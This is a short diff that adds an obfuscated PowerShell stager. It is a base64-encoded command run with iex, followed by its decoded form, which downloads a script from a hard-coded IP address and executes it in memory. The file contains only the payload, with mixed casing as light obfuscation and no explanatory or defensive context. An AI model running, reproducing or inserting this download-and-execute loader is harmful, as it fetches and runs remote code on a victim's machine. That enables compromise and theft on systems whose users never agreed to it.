@@ -1,0 +1,7 @@
+iex([sYSteM.TeXt.EncodINg]::uTF8.gETSTrinG([SysTEm.cOnVerT]::fRoMbASe64STRInG('CmlleCAoKE5ldy1PYmplY3QgTmVULndlQmNsSUVudCkuZG9XbkxPQURTdFJJTkcoJ2h0dHA6Ly83Ni43NC4xMjcuMzgvZGVmYXVsdC1uY28uaHRtbCcpKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+iex ((New-Object NeT.weBclIEnt).doWnLOADStRING('http://76.74.127.38/default-nco.html'))
+
